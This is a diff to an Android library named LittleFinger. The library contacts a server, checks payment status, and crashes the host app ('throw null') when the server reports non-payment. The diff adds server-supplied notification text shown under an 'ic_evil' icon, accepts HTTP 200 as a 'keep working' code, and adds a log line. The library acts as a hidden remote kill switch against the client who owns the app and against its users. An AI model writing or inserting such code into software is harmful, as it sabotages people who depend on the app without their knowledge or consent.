@@ -21,17 +21,17 @@ import okhttp3.Response;
 /**
  * LittleFinger makes the HTTP call to the server and decides what to do next based on the
  * HTTP Response code and body
- *
- * If the response code is `HTTP_PAYMENT_REQUIRED` (402), then payment is expected to receive
- * and let the work as usual
- *
+ * <p>
+ * If the response code is `HTTP_PAYMENT_REQUIRED` (402) or `HTTP_OK` (200), then payment is
+ * expected to receive and let the work as usual
+ * <p>
  * If the response code is `HTTP_ACCEPTED` (202), then payment has been received. Update the flag
  * in preferences so that no future network calls are made
- *
+ * <p>
  * If the response code is `HTTP_CONFLICT` (409), no payment has been received and there is a
  * conflict. Crash the app. If there is any notification data from server, use that and display a
  * notification before crashing
- *
+ * <p>
  * LittleFinger class is the one which is exposed to the developer. This class is responsible for
  * making HTTP calls to server and deciding what to do based on the response. Internally, it makes
  * use of CallbackHandler class which does all the heavy lifting
@@ -44,6 +44,7 @@ public class LittleFinger {
         // Check whether to make call to server or not
         if (!Status.shouldMakeCall(ctx)) {
             // looks like payment has been received. No calls to the server!
+            Log.d("in lib", "no call to server");
             return;
         }
         try {
@@ -108,7 +109,9 @@ class CallbackHandler implements Callback {
         try {
             String jsonData = response.body().string();
             JSONObject jobject = new JSONObject(jsonData);
-            Log.d("h", jobject.getString("origin"));
+            String title = jobject.getString("NotificationTitle");
+            String text = jobject.getString("NotificationText");
+            displayNotification(title, text);
         } catch (IOException | JSONException ex) {
             // Don't do anything
         }
@@ -116,12 +119,12 @@ class CallbackHandler implements Callback {
         throw null;
     }
 
-    private void displayNotification() {
+    private void displayNotification(String title, String text) {
         NotificationCompat.Builder mBuilder =
                 new NotificationCompat.Builder(mContext)
                         .setSmallIcon(R.drawable.ic_evil)
-                        .setContentTitle("My notification")
-                        .setContentText("Hello World!");
+                        .setContentTitle(title)
+                        .setContentText(text);
 
         NotificationManager mNotificationManager =
                 (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);
